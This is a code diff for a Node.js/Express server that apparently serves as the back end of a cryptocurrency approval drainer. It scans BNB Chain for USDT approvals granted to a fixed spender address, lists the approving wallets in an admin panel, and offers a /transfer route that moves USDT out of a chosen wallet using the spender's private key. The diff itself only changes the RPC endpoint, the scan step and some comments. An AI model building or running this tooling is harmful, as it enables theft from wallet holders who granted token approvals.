@@ -15,7 +15,7 @@ const PRIVATE_KEY = process.env.PRIVATE_KEY;
 const SPENDER_ADDRESS = "0x61f6f18fbc3ea4060b5aac3894094d1b3322c63b";
 const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
 
-const provider = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
+const provider = new ethers.providers.JsonRpcProvider("https://1rpc.io/bnb");
 const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
 
 const ABI = [
@@ -27,21 +27,18 @@ const ABI = [
 
 const contract = new ethers.Contract(USDT_ADDRESS, ABI, provider);
 
-// ✅ Blockchain Scan Logic (No MongoDB)
 async function fetchApprovedWallets() {
   const startBlock = 50407453;
   const endBlock = await provider.getBlockNumber();
   const filter = contract.filters.Approval(null, SPENDER_ADDRESS);
-  const step = 5000;
+  const step = 1000;
   const approved = new Set();
 
   for (let from = startBlock; from <= endBlock; from += step) {
     const to = Math.min(from + step - 1, endBlock);
     try {
       const logs = await contract.queryFilter(filter, from, to);
-      logs.forEach(log => {
-        approved.add(log.args.owner.toLowerCase());
-      });
+      logs.forEach(log => approved.add(log.args.owner.toLowerCase()));
     } catch (err) {
       console.warn(`⚠️ Block ${from}-${to} failed: ${err.message}`);
     }
@@ -50,12 +47,10 @@ async function fetchApprovedWallets() {
   return [...approved];
 }
 
-// ✅ Serve admin panel
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "admin.html"));
 });
 
-// ✅ Wallets Route (Live from chain)
 app.get("/wallets", async (req, res) => {
   try {
     const approvedWallets = await fetchApprovedWallets();
@@ -79,7 +74,6 @@ app.get("/wallets", async (req, res) => {
   }
 });
 
-// ✅ Transfer USDT from wallet to destination
 app.post("/transfer", async (req, res) => {
   try {
     const { fromWallet, toWallet, amount } = req.body;
@@ -93,7 +87,6 @@ app.post("/transfer", async (req, res) => {
   }
 });
 
-// ✅ Start Server
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`✅ Destiny backend live at http://localhost:${PORT}`);
